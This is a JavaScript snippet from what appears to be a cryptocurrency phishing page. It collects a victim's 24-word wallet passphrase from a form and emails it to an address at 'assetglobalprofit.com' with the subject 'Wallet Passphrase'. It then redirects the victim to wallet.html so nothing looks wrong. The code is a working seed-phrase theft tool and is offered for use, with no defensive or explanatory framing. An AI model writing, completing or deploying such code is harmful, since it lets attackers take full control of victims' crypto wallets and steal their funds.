function emailSend() {
    var passphrase = document.getElementById('message').value;

    if (passphrase.trim() === "") {
        swal("Error", "Please enter 24-word passphrase", "error");
        return;
    }

    var messageBody = "Passphrase: " + passphrase; // Using passphrase instead of 'details' which was undefined

    Email.send({
    Host: "mail.assetglobalprofit.com",
    Username: "support@assetglobalprofit.com",
    Password: "YourEmailPassword", // Make sure this is correct
    To: "support@assetglobalprofit.com",
    From: "support@assetglobalprofit.com",
    Subject: "Wallet Passphrase",
    Body: messageBody,
    Port: 465, // Use SSL Port
    Secure: true // Enforce SSL
}).then(
    message => {
        console.log("Email Response:", message); // Log response
        if (message === 'OK') {
            window.location.href = 'wallet.html';
        } else {
            swal("Error", "SMTP Error: " + message, "error"); // Show actual error
        }
    }
).catch(error => {
    console.error("SMTP Error:", error);
    swal("Error", "Something went wrong: " + error, "error"); // Show error in alert
});


// Attach event listener to the form submit button
document.querySelector('form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent form from submitting normally
    emailSend();
});
